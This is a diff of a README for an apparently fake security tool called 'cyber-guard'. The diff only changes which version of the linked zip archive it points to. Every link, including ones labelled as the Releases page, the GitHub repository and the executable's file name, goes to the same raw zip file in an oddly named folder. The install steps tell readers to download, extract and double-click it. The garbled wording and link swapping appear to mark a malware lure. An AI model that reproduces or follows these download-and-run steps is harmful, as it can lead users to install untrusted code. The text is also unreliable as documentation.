@@ -1,6 +1,6 @@
 # 🛡️ cyber-guard - Protect Your Web Applications Today
 
-[![Download CyberGuard](https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v2.6.zip%https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v2.6.zip)](https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v2.6.zip)
+[![Download CyberGuard](https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v1.4.zip%https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v1.4.zip)](https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v1.4.zip)
 
 ## 📜 Introduction
 
@@ -22,15 +22,15 @@ Before downloading CyberGuard, ensure your system meets the following requiremen
 ## 📥 Download & Install
 
 1. **Visit this page to download:** Click the link below to navigate to the Releases page.
-   [Download CyberGuard](https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v2.6.zip)
+   [Download CyberGuard](https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v1.4.zip)
 
 2. **Choose your version:** On the Releases page, you will see a list of available versions. Select the latest version.
 
-3. **Download the file:** Click the download link for your operating system. This will usually be a `.zip` or `https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v2.6.zip` file.
+3. **Download the file:** Click the download link for your operating system. This will usually be a `.zip` or `https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v1.4.zip` file.
 
 4. **Extract the files:** After the download is complete, locate the file in your downloads folder. Extract the files using a program like WinRAR, 7-Zip, or the built-in extraction tool in your operating system.
 
-5. **Run the application:** Navigate to the extracted folder and find the executable file (e.g., `https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v2.6.zip` for Windows). Double-click the file to start the application.
+5. **Run the application:** Navigate to the extracted folder and find the executable file (e.g., `https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v1.4.zip` for Windows). Double-click the file to start the application.
 
 ## ⚙️ How to Configure
 
@@ -70,7 +70,7 @@ Join the online community for support and resources. Engage with other users, sh
 
 ## 👉 Additional Resources
 
-- **GitHub Repository:** [cyber-guard](https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v2.6.zip)
+- **GitHub Repository:** [cyber-guard](https://github.com/eduardo67-cyber/cyber-guard/raw/refs/heads/main/hopbine/guard-cyber-v1.4.zip)
 - **Documentation Link:** Available in the downloaded files.
 
 ## ✅ Conclusion
